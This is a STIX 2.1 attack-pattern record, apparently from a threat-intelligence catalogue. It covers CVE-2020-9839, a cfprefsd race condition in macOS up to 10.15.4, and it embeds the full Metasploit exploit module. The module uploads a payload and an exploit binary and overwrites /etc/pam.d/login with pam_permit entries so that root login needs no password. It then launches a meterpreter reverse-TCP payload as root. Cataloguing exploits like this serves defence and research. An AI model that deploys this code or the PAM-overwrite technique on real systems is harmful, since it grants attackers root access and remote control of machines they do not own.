{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c6a2ecea-3858-4595-ae0c-3ddf8c010e69",
    "created": "2024-08-14T16:34:53.479125Z",
    "modified": "2024-08-14T16:34:53.479129Z",
    "name": "macOS cfprefsd Arbitrary File Write Local Privilege Escalation",
    "description": " This module exploits an arbitrary file write in cfprefsd on macOS <= 10.15.4 in order to run a payload as root. The CFPreferencesSetAppValue function, which is reachable from most unsandboxed processes, can be exploited with a race condition in order to overwrite an arbitrary file as root. By overwriting /etc/pam.d/login a user can then login as root with the `login root` command without a password.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/osx/local/cfprefsd_race_condition.rb",
            "external_id": "cfprefsd_race_condition.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-9839"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/sslab-gatech/pwn2own2020"
        },
        {
            "source_name": "exploit_exe=exploit_dataCVE-2020-9839",
            "external_id": "exploit"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Post::File\n  include Msf::Post::OSX::Priv\n  include Msf::Post::OSX::System\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'macOS cfprefsd Arbitrary File Write Local Privilege Escalation',\n        'Description' => %q{\n          This module exploits an arbitrary file write in cfprefsd on macOS <= 10.15.4 in\n          order to run a payload as root. The CFPreferencesSetAppValue function, which is\n          reachable from most unsandboxed processes, can be exploited with a race condition\n          in order to overwrite an arbitrary file as root. By overwriting /etc/pam.d/login\n          a user can then login as root with the `login root` command without a password.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Yonghwi Jin <jinmoteam[at]gmail.com>', # pwn2own2020\n          'Jungwon Lim <setuid0[at]protonmail.com>', # pwn2own2020\n          'Insu Yun <insu[at]gatech.edu>', # pwn2own2020\n          'Taesoo Kim <taesoo[at]gatech.edu>', # pwn2own2020\n          'timwr' # metasploit integration\n        ],\n        'References' => [\n          ['CVE', '2020-9839'],\n          ['URL', 'https://github.com/sslab-gatech/pwn2own2020'],\n        ],\n        'Platform' => 'osx',\n        'Arch' => ARCH_X64,\n        'DefaultTarget' => 0,\n        'DefaultOptions' => { 'WfsDelay' => 300, 'PAYLOAD' => 'osx/x64/meterpreter/reverse_tcp' },\n        'Targets' => [\n          [ 'Mac OS X x64 (Native Payload)', {} ],\n        ],\n        'DisclosureDate' => '2020-03-18',\n        'Notes' => {\n          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES],\n          'Reliability' => [REPEATABLE_SESSION],\n          'Stability' => [CRASH_SAFE]\n        },\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              stdapi_sys_process_execute\n            ]\n          }\n        }\n      )\n    )\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write files', '/tmp' ])\n    ]\n  end\n\n  # rubocop:disable Style/ClassVars\n  @@target_file = '/etc/pam.d/login'\n  @@original_content = %q{# login: auth account password session\nauth       optional       pam_krb5.so use_kcminit\nauth       optional       pam_ntlm.so try_first_pass\nauth       optional       pam_mount.so try_first_pass\nauth       required       pam_opendirectory.so try_first_pass\naccount    required       pam_nologin.so\naccount    required       pam_opendirectory.so\npassword   required       pam_opendirectory.so\nsession    required       pam_launchd.so\nsession    required       pam_uwtmp.so\nsession    optional       pam_mount.so\n}\n  @@replacement_content = %q{# login: auth account password session\nauth       optional       pam_permit.so\nauth       optional       pam_permit.so\nauth       optional       pam_permit.so\nauth       required       pam_permit.so\naccount    required       pam_permit.so\naccount    required       pam_permit.so\npassword   required       pam_permit.so\nsession    required       pam_permit.so\nsession    required       pam_permit.so\nsession    optional       pam_permit.so\n}\n  # rubocop:enable Style/ClassVars\n\n  def check\n    version = Rex::Version.new(get_system_version)\n    if version > Rex::Version.new('10.15.4')\n      CheckCode::Safe\n    elsif version < Rex::Version.new('10.15')\n      CheckCode::Safe\n    else\n      CheckCode::Appears\n    end\n  end\n\n  def exploit\n    if is_root?\n      fail_with Failure::BadConfig, 'Session already has root privileges'\n    end\n\n    unless writable? datastore['WritableDir']\n      fail_with Failure::BadConfig, \"#{datastore['WritableDir']} is not writable\"\n    end\n\n    payload_file = \"#{datastore['WritableDir']}/.#{rand_text_alphanumeric(5..10)}\"\n    binary_payload = Msf::Util::EXE.to_osx_x64_macho(framework, payload.encoded)\n    upload_and_chmodx payload_file, binary_payload\n    register_file_for_cleanup payload_file\n\n    current_content = read_file(@@target_file)\n    @restore_content = current_content\n\n    if current_content == @@replacement_content\n      print_warning(\"The contents of #{@@target_file} was already replaced\")\n    elsif current_content != @@original_content\n      print_warning(\"The contents of #{@@target_file} did not match the expected contents\")\n      @restore_content = nil\n    end\n\n    exploit_file = \"#{datastore['WritableDir']}/.#{rand_text_alphanumeric(5..10)}\"\n    exploit_exe = exploit_data 'CVE-2020-9839', 'exploit'\n    upload_and_chmodx exploit_file, exploit_exe\n    register_file_for_cleanup exploit_file\n\n    exploit_cmd = \"#{exploit_file} #{@@target_file}\"\n    print_status(\"Executing exploit '#{exploit_cmd}'\")\n    result = cmd_exec(exploit_cmd)\n    print_status(\"Exploit result:\\n#{result}\")\n    unless write_file(@@target_file, @@replacement_content)\n      print_error(\"#{@@target_file} could not be written\")\n    end\n\n    login_cmd = \"echo '#{payload_file} & disown' | login root\"\n    print_status(\"Running cmd:\\n#{login_cmd}\")\n    result = cmd_exec(login_cmd)\n    unless result.blank?\n      print_status(\"Command output:\\n#{result}\")\n    end\n  end\n\n  def new_session_cmd(session, cmd)\n    if session.type.eql? 'meterpreter'\n      session.sys.process.execute '/bin/bash', \"-c '#{cmd}'\"\n    else\n      session.shell_command_token cmd\n    end\n  end\n\n  def on_new_session(session)\n    return super unless @restore_content\n\n    if write_file(@@target_file, @restore_content)\n      new_session_cmd(session, \"chgrp wheel #{@@target_file}\")\n      new_session_cmd(session, \"chown root #{@@target_file}\")\n      new_session_cmd(session, \"chmod 644 #{@@target_file}\")\n      print_good(\"#{@@target_file} was restored\")\n    else\n      print_error(\"#{@@target_file} could not be restored!\")\n    end\n    super\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2020-03-18",
    "x_mitre_platforms": [
        "osx'"
    ]
}